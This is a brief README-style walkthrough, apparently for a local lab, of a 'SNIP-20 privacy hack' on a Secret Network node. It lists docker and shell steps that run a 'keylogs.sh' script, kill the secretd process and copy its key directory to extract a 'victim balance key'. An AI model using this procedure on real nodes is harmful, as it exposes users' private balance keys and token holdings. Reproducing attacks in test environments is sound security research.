## SNIP-20 privacy hack
```
docker-compose down
docker system prune

./build_image.sh

sudo ./start_node.sh

./node_modules/.bin/jest -t Setup
./keylogs.sh
```
Get the victim balance key.

```
docker exec -it hacking-localsecret-2-1 bash
pkill -f secretd
cp -rf /root/.secretd/* backup/
vim backup/vimtim_key
```
Store the victim balance key.

```
./scripts/test_snip20.sh
```

